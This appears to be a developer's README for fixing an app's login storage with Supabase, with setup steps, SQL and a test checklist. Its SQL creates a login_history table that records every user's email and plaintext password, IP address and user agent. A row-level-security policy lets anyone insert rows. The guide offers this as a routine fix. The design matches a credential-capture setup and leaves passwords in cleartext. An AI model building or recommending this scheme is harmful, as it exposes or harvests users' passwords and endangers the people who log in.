# Fix Login Data Storage Issue

## Problem: Login data not saving to backend

## Solution Steps:

### 1. Configure Supabase Credentials
Edit `src/app/services/supabase-auth.service.ts`:

```typescript
this.supabase = createClient(
  'https://your-project-ref.supabase.co', // Replace with your actual URL
  'your-anon-key-here' // Replace with your actual anon key
);
```

**Get your credentials:**
1. Go to supabase.com
2. Open your project
3. Go to Settings → API
4. Copy Project URL and anon public key

### 2. Create Database Table
Run this SQL in Supabase SQL Editor:

```sql
-- Create login_history table
CREATE TABLE login_history (
  id SERIAL PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT NOT NULL,
  login_time TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  user_agent TEXT,
  ip_address TEXT
);

-- Enable Row Level Security
ALTER TABLE login_history ENABLE ROW LEVEL SECURITY;

-- Allow anyone to insert login history
CREATE POLICY "Allow login history insert" ON login_history
  FOR INSERT WITH CHECK (true);
```

### 3. Test Login
1. Update Supabase credentials
2. Run the SQL to create table
3. Try logging in
4. Check browser console for logs
5. Check Supabase → Table Editor → login_history

### 4. Verify Data
After login, you should see:
- Console log: "✅ Login history saved successfully"
- Data in login_history table in Supabase

## Quick Test Commands:
```bash
# 1. Update credentials in supabase-auth.service.ts
# 2. Run SQL in Supabase dashboard
# 3. Test login at /supabase-login
# 4. Check console and database
```